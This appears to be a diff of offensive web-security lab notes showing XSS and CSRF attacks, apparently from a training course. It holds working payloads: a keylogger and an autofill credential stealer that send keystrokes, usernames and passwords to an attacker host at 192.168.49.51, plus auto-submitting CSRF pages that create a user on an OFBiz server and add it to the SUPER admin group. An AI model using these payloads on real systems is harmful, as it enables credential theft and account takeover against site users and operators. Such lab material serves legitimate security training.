@@ -36,3 +36,107 @@ let encodedData = encodeURIComponent(data)
 fetch("http://192.168.49.51/exfil?data=" + encodedData)
 
 kali@kali:~/xss$ python3 -m http.server 80
+
+Keylogging with XSS is limited though. We are able to keylog by creating an event listener for any keystroke, but it can only be set on the current document. That means if the user is on a different tab or in a different application, we won't be able to intercept their keystrokes. However, if the user is typing a private message or attempting to log in on our target site, we can capture those events.
+
+The JavaScript event for keypresses is keydown, which will be passed into the addEventListener function. This function also accepts a callback function to run for each keydown event. Within this function, we'll send the key that was pressed back to our server.
+
+function logKey(event){
+        fetch("http://192.168.49.51/k?key=" + event.key)
+}
+
+document.addEventListener('keydown', logKey);
+
+python3 -m http.server 80
+
+While we could add the HTML input tags in the script payload, we'll keep everything in the xss.js file instead to stay organized. In this file, we'll have to create a username and password input. Once the inputs are added to the page, the password manager would automatically fill them with the saved credentials. After some time, we'll send the value of the input back to our Kali machine.
+
+let body = document.getElementsByTagName("body")[0]
+  
+    var u = document.createElement("input");
+    u.type = "text";
+    u.style.position = "fixed";
+    //u.style.opacity = "0";
+  
+    var p = document.createElement("input");
+    p.type = "password";
+    p.style.position = "fixed";
+    //p.style.opacity = "0";
+ 
+    body.append(u)
+    body.append(p)
+ 
+    setTimeout(function(){ 
+        fetch("http://192.168.49.51/k?u=" + u.value + "&p=" + p.value)
+ }, 5000);
+ 
+ python3 -m http.server 80
+
+et's start by building a small HTML page to exploit the CSRF vulnerabilities in this application to add a new user. We'll start with the basic structure of a form element and JavaScript to submit the form on page load. Let's create a file named offgrid.html in /var/www/html so that later on, we can use Apache to serve the page.
+
+<html>
+<body onload="document.forms['csrf'].submit()">
+  <form action="https://ofbiz:8443/webtools/control/createUserLogin" method="post" name="csrf">
+    <input type="hidden" name="enabled">
+    <input type="hidden" name="partyId">
+    <input type="hidden" name="userLoginId" value="csrftest">
+    <input type="hidden" name="currentPassword" value="password">
+    <input type="hidden" name="currentPasswordVerify" value="password">
+    <input type="hidden" name="passwordHint">
+    <input type="hidden" name="requirePasswordChange" value="N">
+    <input type="hidden" name="externalAuthId">
+    <input type="hidden" name="securityQuestion">
+    <input type="hidden" name="securityAnswer">
+  </form>
+  <form action="https://ofbiz:8443/webtools/control/userLogin_addUserLoginToSecurityGroup" method="post" name="csrf2" target="_blank">
+    <input type="hidden" name="userLoginId" value="csrftest">
+    <input type="hidden" name="partyId">
+    <input type="hidden" name="groupId" value="SUPER">
+    <input type="hidden" name="fromDate_i18n">
+    <input type="hidden" name="fromDate">
+    <input type="hidden" name="thruDate_i18n">
+    <input type="hidden" name="thruDate">
+  </form>
+</body>
+</html>
+
+sudo systemctl restart apache2
+
+Let's copy our existing HTML page into a new file named offgrid1.html
+
+sudo cp /var/www/html/ofbiz.html /var/www/html/ofbiz1.html
+
+<head>
+<script>
+  function submitForms() {
+    document.forms['csrf'].submit();
+    document.forms['csrf2'].submit();
+    return false;
+  }
+</script>
+</head>
+<body onload="submitForms();">
+  <form action="https://ofbiz:8443/webtools/control/createUserLogin" method="post" name="csrf">
+    <input type="hidden" name="enabled">
+    <input type="hidden" name="partyId">
+    <input type="hidden" name="userLoginId" value="csrftest">
+    <input type="hidden" name="currentPassword" value="password">
+    <input type="hidden" name="currentPasswordVerify" value="password">
+    <input type="hidden" name="passwordHint">
+    <input type="hidden" name="requirePasswordChange" value="N">
+    <input type="hidden" name="externalAuthId">
+    <input type="hidden" name="securityQuestion">
+    <input type="hidden" name="securityAnswer">
+  </form>
+  <form action="https://ofbiz:8443/webtools/control/userLogin_addUserLoginToSecurityGroup" method="post" name="csrf2" target="_blank">
+    <input type="hidden" name="userLoginId" value="csrftest">
+    <input type="hidden" name="partyId">
+    <input type="hidden" name="groupId" value="SUPER">
+    <input type="hidden" name="fromDate_i18n">
+    <input type="hidden" name="fromDate">
+    <input type="hidden" name="thruDate_i18n">
+    <input type="hidden" name="thruDate">
+  </form>
+</body>
+</html>
+
